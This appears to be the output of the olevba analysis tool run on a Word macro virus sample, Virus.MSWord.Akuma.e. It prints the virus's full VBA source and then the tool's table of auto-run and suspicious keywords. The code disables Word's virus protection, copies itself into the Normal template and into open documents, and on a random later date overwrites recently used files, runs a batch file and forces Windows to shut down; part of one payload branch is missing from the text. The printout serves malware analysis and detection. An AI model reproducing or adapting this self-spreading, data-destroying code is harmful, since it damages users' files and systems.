olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Akuma.e-ce74b97b30bf394e081e3350b5b1a4e2b064b17e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Akuma.e-ce74b97b30bf394e081e3350b5b1a4e2b064b17e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Stand()
'Stand
'3
'Copies: 542
    On Error Resume Next
    stato = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Tools").Controls("Macro").Enabled = False
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 9
    Set mad = NormalTemplate.VBProject.VBComponents.Item(1)
    For c = 1 To 2
        If Left(StandFind(mad, "Private Sub Stand()", True), Len("Stand Yes")) = "Stand Yes" Then GoTo NoClear
        StandClear mad, "Private Sub ViewVBCode()"
        StandClear mad, "Sub Document_Close()"
        StandClear mad, "Private Sub Document_Close()"
        StandClear mad, "Sub Document_New()"
        StandClear mad, "Private Sub Document_New()"
        StandClear mad, "Sub Document_Open()"
        StandClear mad, "Private Sub Document_Open()"
        StandClear mad, "Sub AutoClose()"
        StandClear mad, "Private Sub AutoClose()"
        StandClear mad, "Sub AutoOpen()"
        StandClear mad, "Private Sub AutoOpen()"
        StandClear mad, "Sub AutoNew()"
        StandClear mad, "Private Sub AutoNew()"
        StandClear mad, "Private Sub Stand()"
        StandClear mad, "Private Function StandClear(DoveM, StartM)"
        StandClear mad, "Private Sub StandDestroy()"
        StandClear mad, "Private Function StandFind(DoveM, StartM, Infect)"
        StandClear mad, "Private Function StandInfect()"
        StandClear mad, "Private Function StandWrite(StartM)"
NoClear:
        Set mad = ActiveDocument.VBProject.VBComponents.Item(1)
    Next c
    SetAttr "c:\Stand.log", vbNormal
    Kill "c:\Stand.log"
    Open "c:\Stand.log" For Output As #1
    StandWrite "Private Sub Stand()"
    StandWrite "Private Function StandClear(DoveM, StartM)"
    StandWrite "Private Sub StandDestroy()"
    StandWrite "Private Function StandFind(DoveM, StartM, Infect)"
    StandWrite "Private Function StandInfect()"
    StandWrite "Private Function StandWrite(StartM)"
    StandWrite "Private Sub Document_Close()"
    StandWrite "Private Sub Document_Open()"
    StandWrite "Private Sub Document_New()"
    StandWrite "Private Sub ViewVBCode()"
    Close #1
    SetAttr "c:\Stand.log", vbNormal
    arg = StandInfect
    Kill "c:\Stand.log"
    Set stress = ActiveDocument
    If Left(ActiveDocument.Name, 8) <> "Document" And arg = 2 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ActiveDocument.Saved = stato
    On Error GoTo 0
End Sub

Private Function StandClear(DoveM, StartM)
'Stand
'3
    Count = StandFind(DoveM, StartM, True)
    If Left(Count, 5) <> "Stand" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Sub StandDestroy()
'Stand
'3
    On Error Resume Next
    SetAttr "c:\autoexec.kil", vbNormal
    Kill "c:\autoexec.kil"
    Randomize
    WhickStand = Int(5 * Rnd) + 1
    Select Case WhickStand
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
            Print #1, "rem Hey, looser, now your system, next time I'll KILL YOU"
            Close #1
            Shell "c:\kill.bat"
        Case 2
            MsgBox "This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Killer Queen"
            For c = 1 To Application.RecentFiles.Count
                If Left(Application.RecentFiles.Item(c).Path, 3) <> "A:\" Then
                    Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
                    Print #1, "Killer Queen kills stupid people like you, " + Application.UserName + "."
                    Close #1
                End If
            Next c
            Tasks.ExitWindows
        Case 3
            MsgBox "This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Vanilla Ice"
            Tasks.ExitWindows
        Case 4
            MsgBox "This application caused a general protection error", vbCritical, "Star Platinum"
        Case 5
            MsgBox "This application caused a general protection error", vbCritical, "Crazy Diamond"
    End Select
    On Error GoTo 0
End Sub

Private Function StandFind(DoveM, StartM, Infect)
'Stand
'3
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            If Infect = False Then
                If StartM = "Private Sub Stand()" Then
                    var = Val(Trim(Right(DoveM.CodeModule.Lines(Count + 3, 1), Len(DoveM.CodeModule.Lines(Count + 3, 1)) - 8)))
                    DoveM.CodeModule.ReplaceLine (Count + 3), "'Copies:" + Str(var + 1)
                End If
            End If
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) >= 3 Then
                StandFind = "Stand Yes" + Str(Count)
                Exit Function
            ElseIf Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) < 3 Then
                GoTo FindIt
            Else
FindIt:         For cnt = 1 To DoveM.CodeModule.CountOfLines
                    If LCase$(DoveM.CodeModule.Lines(cnt, 1)) = LCase$(StartM) Then Exit For
                Next cnt
                StandFind = cnt
                Exit Function
            End If
        End If
    Next Count
    StandFind = "Stand"
End Function

Private Function StandInfect()
'Stand
'3
    If StandFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set mad = NormalTemplate.VBProject.VBComponents.Item(1): flag = True: StandInfect = 1
    ElseIf StandFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set mad = ActiveDocument.VBProject.VBComponents.Item(1): flag = True: StandInfect = 2
    Else
        flag = False: StandInfect = 3
    End If
    If flag = True Then
        Open "c:\Stand.log" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            mad.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

Private Function StandWrite(StartM)
'Stand
'3
    Count = StandFind(MacroContainer.VBProject.VBComponents.Item(1), StartM, False)
    If Count <> "Stand" Then
        If Left(Count, Len("Stand Yes")) = "Stand Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Stand Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

Private Sub Document_Close()
'Stand
'3
    On Error Resume Next
    If Dir("c:\autoexec.kil", vbArchive + vbHidden + vbReadOnly) = "" Then
        Open "c:\autoexec.kil" For Output As #1
        Randomize
        Dataccia = DateAdd("d", Int((30 * Rnd) + 1), Date)
        Print #1, Dataccia
        Close #1
        SetAttr "c:\autoexec.kil", vbArchive + vbHidden + vbReadOnly
    Else
        Open "c:\autoexec.kil" For Input As #1
        Line Input #1, Dataccia
        Close #1
        If DateDiff("d", Date, Dataccia) <= 0 Then StandDestroy
    End If
End Sub

Private Sub Document_Open()
'Stand
'3
    Stand
End Sub

Private Sub Document_New()
'Stand
'3
    Stand
End Sub

Private Sub ViewVBCode()
    MsgBox "This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Dr. Watson"
    Tasks.ExitWindows
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kill.bat            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

